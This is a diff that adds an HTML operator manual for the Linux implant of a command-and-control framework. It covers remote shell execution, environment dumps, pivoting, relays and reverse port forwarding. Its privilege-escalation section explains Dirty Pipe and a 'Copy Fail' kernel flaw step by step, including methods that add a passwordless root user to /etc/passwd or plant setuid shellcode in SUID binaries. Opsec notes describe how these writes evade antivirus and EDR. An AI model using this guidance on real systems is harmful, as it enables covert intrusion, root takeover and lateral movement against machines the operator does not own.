@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Linux Beacon Commands</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Home</a> &raquo; <a href="commands.html">Commands</a> &raquo; Linux beacon</nav>
+
+<h1>Linux Beacon Commands</h1>
+
+<p>The Linux beacon supports all <b>common commands</b> (filesystem, shell, sleep, exit,
+screenshot, download, upload) plus a set of Linux-specific commands.
+Common commands are described in the <a href="commands.html">main reference</a>.</p>
+
+<div class="note">
+The Linux beacon is built as an ELF binary (<code>beacon-linux64</code>) and a shared
+library (<code>beacon-linux64.so</code>). The library variant is loaded via
+<code>LD_PRELOAD</code> or <code>dlopen</code> &mdash; the beacon starts in a separate
+thread when the <code>.so</code> is loaded.
+</div>
+
+<h2 id="fs-linux">Filesystem</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>cat</code></td><td><code>&lt;path&gt;</code></td>
+    <td>Print file contents. Chunked transfer for large files.</td></tr>
+<tr><td><code>mkdir</code></td><td><code>&lt;path&gt;</code></td>
+    <td>Create a directory (<code>mkdir(path, 0755)</code>).</td></tr>
+<tr><td><code>chmod</code></td><td><code>&lt;mode&gt; &lt;path&gt;</code></td>
+    <td>Change file permissions. Mode is specified as an octal number
+        (e.g. <code>chmod 755 /tmp/payload</code>).</td></tr>
+</table>
+
+<h2 id="exec-linux">Execution and Processes</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>shell</code></td><td><code>&lt;cmd&gt;</code></td>
+    <td>Execute a command via <code>fork()</code> + <code>execl("/bin/sh", "sh", "-c", cmd)</code>.
+        Stdout and stderr are captured via <code>pipe()</code>.</td></tr>
+<tr><td><code>ps</code></td><td></td>
+    <td>Process list: reads <code>/proc/[pid]/stat</code>,
+        <code>/proc/[pid]/status</code>, and <code>/proc/[pid]/cmdline</code>.
+        Format: <code>PID|PPID|UID|USER|CMD</code>.</td></tr>
+<tr><td><code>kill</code></td><td><code>&lt;pid&gt;</code></td>
+    <td>Terminate a process with <code>SIGKILL</code>.</td></tr>
+</table>
+
+<h2 id="sysinfo">System Information</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>whoami</code></td><td></td>
+    <td>Current user (<code>getpwuid(getuid())</code>).</td></tr>
+<tr><td><code>id</code></td><td></td>
+    <td>UID, GID, EUID, EGID, and the list of supplementary groups.</td></tr>
+<tr><td><code>hostname</code></td><td></td>
+    <td>Hostname (<code>gethostname()</code>).</td></tr>
+<tr><td><code>env</code></td><td></td>
+    <td>Process environment variables (full <code>environ</code> dump).
+        Data is transferred in chunks for large output.</td></tr>
+<tr><td><code>ifconfig</code></td><td></td>
+    <td>List of network interfaces and IP addresses (IPv4/IPv6) via
+        <code>getifaddrs()</code>.</td></tr>
+</table>
+
+<h2 id="screenshot-linux">Screenshot</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>screenshot</code></td><td></td>
+    <td>Capture the screen as a 24-bit BMP. The file is saved on the operator's desktop:
+        <code>screenshot_&lt;beaconId&gt;_&lt;timestamp&gt;.bmp</code>.</td></tr>
+</table>
+
+<p>Two capture methods (in priority order):</p>
+<ol>
+<li><b>X11</b> &mdash; loads <code>libX11.so.6</code> via <code>dlopen()</code>
+    (no compile-time dependency). Captures the root window
+    (<code>XGetImage</code> on root window). Supports 32/24/16-bit color.
+    Works on systems with an X server.</li>
+<li><b>Framebuffer</b> &mdash; reads <code>/dev/fb0</code> via <code>mmap()</code>.
+    Works on TTY, embedded systems, and servers without a graphical environment.
+    Requires read access to <code>/dev/fb0</code>.</li>
+</ol>
+
+<div class="note">
+If neither X11 nor framebuffer is available, the command returns an error:
+<code>screenshot: no X11 display and /dev/fb0 unavailable</code>.
+</div>
+
+<h2 id="privesc-linux">Privilege Escalation</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>privesc_root</code></td><td><code>[method]</code></td>
+    <td>Escalate privileges to root via kernel vulnerabilities.</td></tr>
+</table>
+
+<p>Two vulnerability families are supported:</p>
+<ul>
+<li><b>Dirty Pipe</b> (CVE-2022-0847) &mdash; page cache overwrite via pipe buffer flag.
+    Kernels 5.8&ndash;5.16.10.</li>
+<li><b>Copy Fail</b> (CVE-2026-31431) &mdash; scratch-write into page cache via
+    the <code>authencesn</code> template of AF_ALG. Kernels 4.14&ndash;6.19.12.</li>
+</ul>
+
+<h3 id="privesc-methods">Methods</h3>
+<table>
+<tr><th>Method</th><th>Syntax</th><th>CVE</th><th>Description</th></tr>
+<tr><td><code>passwd</code></td><td><code>privesc_root passwd</code></td>
+    <td>2022-0847</td>
+    <td>Overwrite <code>/etc/passwd</code>: adds user
+        <code>r00t</code> (uid=0, empty password). Dirty Pipe.</td></tr>
+<tr><td><code>suid</code></td><td><code>privesc_root suid &lt;path&gt;</code></td>
+    <td>2022-0847</td>
+    <td>Overwrite a SUID binary: writes an ELF shellcode
+        (<code>setuid(0)+execve("/bin/sh")</code>). Dirty Pipe.</td></tr>
+<tr><td><code>afalg</code></td><td><code>privesc_root afalg &lt;path&gt;</code></td>
+    <td>2022-0847</td>
+    <td>AF_ALG variant of Dirty Pipe: uses an <code>algif_aead</code> socket
+        instead of a regular pipe. Bypasses some patches.</td></tr>
+<tr><td><code>copyfail</code></td><td><code>privesc_root copyfail &lt;path&gt;</code></td>
+    <td>2026-31431</td>
+    <td>Overwrite a SUID binary via Copy Fail: scratch-write from the
+        <code>authencesn</code> module writes 4 bytes per operation into page cache.
+        Deterministic write (no race condition).</td></tr>
+<tr><td><code>copyfail_passwd</code></td><td><code>privesc_root copyfail_passwd</code></td>
+    <td>2026-31431</td>
+    <td>Overwrite <code>/etc/passwd</code> via Copy Fail.
+        Equivalent to the <code>passwd</code> method but for kernels 4.14&ndash;6.19.</td></tr>
+</table>
+
+<h3 id="privesc-copyfail">CVE-2026-31431 — Copy Fail</h3>
+<p>A logic error in the <code>authencesn</code> (Extended Sequence Number) template
+of the <code>algif_aead</code> module. During decryption the kernel writes 4 bytes from the IV
+at position <code>assoclen-8</code> in the source scatterlist. If the data pages were
+obtained via <code>splice()</code> from a file, the write goes directly into the page cache.</p>
+
+<p><b>Mechanism:</b></p>
+<ol>
+<li><code>socket(AF_ALG)</code> &rarr; bind to
+    <code>authencesn(hmac(sha256),cbc(aes))</code></li>
+<li><code>setsockopt</code>: key (authencesn format) + authsize=32</li>
+<li><code>accept()</code> &rarr; operation fd</li>
+<li><code>sendmsg()</code> with cmsg: op=decrypt, IV[0..3]=payload, assoclen=offset+12</li>
+<li><code>splice()</code> pages of the target file into the operation fd (zero-copy)</li>
+<li><code>recv()</code> &rarr; kernel calls <code>crypto_authenc_esn_decrypt()</code>
+    &rarr; writes IV[0..3] to <code>src[assoclen-8]</code> = file page cache</li>
+</ol>
+
+<p><b>Advantages over Dirty Pipe:</b></p>
+<ul>
+<li>Works on kernels <b>4.14+</b> (Dirty Pipe: only 5.8–5.16.10)</li>
+<li>Can write at offset <b>0</b> (Dirty Pipe: minimum 1)</li>
+<li>Deterministic: no race with pipe buffer flags</li>
+</ul>
+
+<p><b>Limitations:</b></p>
+<ul>
+<li>4 bytes per operation (Dirty Pipe: up to PAGE_SIZE)</li>
+<li>Requires the <code>algif_aead</code> + <code>authencesn</code> module in the kernel</li>
+<li>Target file must be &ge; 256 bytes (for splice)</li>
+</ul>
+
+<h3 id="privesc-kernel">Compatibility (Dirty Pipe — CVE-2022-0847)</h3>
+<table>
+<tr><th>Kernel</th><th>Status</th></tr>
+<tr><td>&lt; 5.8</td><td>Not vulnerable (PIPE_BUF_FLAG_CAN_MERGE absent)</td></tr>
+<tr><td>5.8 &ndash; 5.10.101</td><td>Vulnerable</td></tr>
+<tr><td>5.10.102+</td><td>Patched</td></tr>
+<tr><td>5.11 &ndash; 5.15.24</td><td>Vulnerable</td></tr>
+<tr><td>5.15.25+</td><td>Patched</td></tr>
+<tr><td>5.16 &ndash; 5.16.10</td><td>Vulnerable</td></tr>
+<tr><td>5.16.11+</td><td>Patched</td></tr>
+</table>
+
+<h3 id="privesc-kernel-copyfail">Compatibility (Copy Fail — CVE-2026-31431)</h3>
+<table>
+<tr><th>Kernel</th><th>Status</th></tr>
+<tr><td>&lt; 4.14</td><td>Not vulnerable (<code>authencesn</code> absent)</td></tr>
+<tr><td>4.14 &ndash; 6.19.12</td><td>Vulnerable</td></tr>
+<tr><td>6.19.13+</td><td>Patched</td></tr>
+<tr><td>6.20+</td><td>Patched</td></tr>
+</table>
+
+<div class="opsec">
+Both methods write to the kernel page cache &mdash; user-space antivirus and EDR solutions
+do not intercept the write. However, file integrity systems (AIDE, dm-verity)
+may detect changes. Copy Fail leaves traces in the form of many
+<code>AF_ALG</code> sockets in audit logs (if <code>audit</code> is enabled).
+</div>
+
+<div class="warning">
+<b>Kernel version:</b> check the version before use with
+<code>shell uname -r</code>. Copy Fail additionally checks for the availability of
+the <code>authencesn</code> module &mdash; if the module is not loaded it returns an error.
+</div>
+
+<h2 id="ishell-linux">Interactive Shell (ishell)</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>ishell</code></td><td><code>&lt;text&gt;</code></td>
+    <td>Send a line to the STDIN of a running <code>/bin/sh</code>.
+        If the shell has not been created yet — it is started automatically
+        (<code>fork()</code> + <code>execl("/bin/sh")</code>,
+        I/O via <code>socketpair(AF_UNIX)</code>).</td></tr>
+<tr><td><code>ishell</code></td><td>(empty)</td>
+    <td>Close the interactive shell: close the socket, wait for
+        the child process to exit.</td></tr>
+</table>
+
+<p>Unlike <code>shell</code>, which creates a new process for each command,
+<code>ishell</code> keeps a single <code>/bin/sh</code> between calls.
+This allows running long-running commands (linpeas, tcpdump, etc.)
+and receiving output in parts: the beacon's main loop calls
+<code>ishell_pump()</code> on each iteration and sends accumulated stdout/stderr.</p>
+
+<div class="note">
+The operator console switches to <code>[interactive shell]</code> mode.
+Each entered line is an <code>ishell &lt;text&gt;</code> call.
+The <code>exit</code> command inside this mode closes <code>/bin/sh</code>
+without stopping the beacon.
+</div>
+
+<h2 id="pivot-linux">Pivot and Relay</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>tcp_pivot</code></td><td><code>&lt;host&gt; &lt;port&gt;</code></td>
+    <td>Open a raw TCP channel to a pivot listener on the teamserver.
+        The beacon creates a TCP connection to <code>host:port</code>
+        and multiplexes traffic through this channel.
+        Allows a beacon in an isolated network segment
+        to reach the teamserver through an intermediary beacon.</td></tr>
+</table>
+
+<h3 id="relay-linux">Relay (chain pivot)</h3>
+<p>The Linux beacon supports the relay mechanism — a parent beacon opens a
+TCP port to which child beacons connect. All child beacon traffic is relayed
+through the parent to the teamserver.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>relay_start</code></td><td><code>&lt;port&gt;</code></td>
+    <td>Open a TCP listener on the specified port.
+        Each accepted connection is a child beacon.
+        Maximum 8 simultaneous child sessions.</td></tr>
+<tr><td><code>relay_stop</code></td><td></td>
+    <td>Close the relay listener and all child connections.</td></tr>
+</table>
+
+<p>Relay frames from child beacons are sent with the magic
+<code>task_id = 0xFFFFFFFFFFFFFFFD</code>, which the teamserver routes
+separately from regular responses. The operator sees child beacons as
+independent sessions in the Sessions table.</p>
+
+<div class="note">
+Relay commands are invoked from the Sessions/Graph context menu:
+<b>Start relay port (chain pivot)&hellip;</b> and
+<b>Generate relay child beacon&hellip;</b>.
+Manual console input is not needed.
+</div>
+
+<h3 id="rportfwd-linux">Reverse Port Forward</h3>
+<p>The teamserver opens a TCP port (bind); on incoming connections traffic goes
+through the C2 channel to the beacon, which forwards it to <code>rhost:rport</code>.
+Architecturally &mdash; the mirror of SOCKS5: the client connects to the teamserver, not to
+the operator's proxy client. Maximum 16 simultaneous connections.</p>
+
+<table>
+<tr><th>How to create</th><th>Description</th></tr>
+<tr><td>Sessions &rarr; right-click &rarr; <b>Start Reverse Port Forward&hellip;</b></td>
+    <td>Dialog: <b>Bind host</b> and <b>Bind port</b> &mdash; what the teamserver opens;
+        <b>Rhost</b> and <b>Rport</b> &mdash; the target the beacon connects to.
+        After clicking OK the teamserver starts listening. On the first incoming
+        connection the beacon establishes a connection to rhost:rport.</td></tr>
+</table>
+
+<p><b>Traffic flow:</b></p>
+<pre>external client &rarr; teamserver:bind_port &rarr; (C2 channel) &rarr; beacon &rarr; rhost:rport</pre>
+
+<p><b>Protocol:</b> data is transferred via out-of-band frames with the magic
+<code>task_id = 0xFFFFFFFFFFFFFFFC</code> (<code>RPORTFWD_TASK_MAGIC</code>).
+Frame format: <code>[u64 conn_id BE][u8 type][payload]</code>, where type:</p>
+<ul>
+<li><code>0x01</code> &mdash; CONNECT_OK (beacon successfully connected to rhost:rport)</li>
+<li><code>0x02</code> &mdash; CONNECT_FAIL (connection error)</li>
+<li><code>0x03</code> &mdash; DATA: <code>[u32 len BE][bytes]</code></li>
+<li><code>0x04</code> &mdash; CLOSE (connection closed)</li>
+</ul>
+
+<div class="opsec">
+<b>Example &mdash; access to an internal web server through the teamserver:</b><br>
+Bind host: <code>0.0.0.0</code>, Bind port: <code>8080</code>,
+Rhost: <code>internal-webapp.corp.local</code>, Rport: <code>80</code><br>
+<code>curl http://teamserver-ip:8080/</code><br><br>
+<b>Difference from SOCKS5:</b> SOCKS5 tunnels arbitrary traffic through the polling loop;
+rportfwd opens a specific port directly on the teamserver, requires no
+SOCKS5 client, and works for any TCP protocol.
+</div>
+
+<h2 id="control-linux">Control</h2>
+<p>The <code>sleep</code> and <code>exit</code> commands work identically to the Windows beacon &mdash;
+see <a href="commands.html#control">Beacon Control</a>.</p>
+
+</body></html>
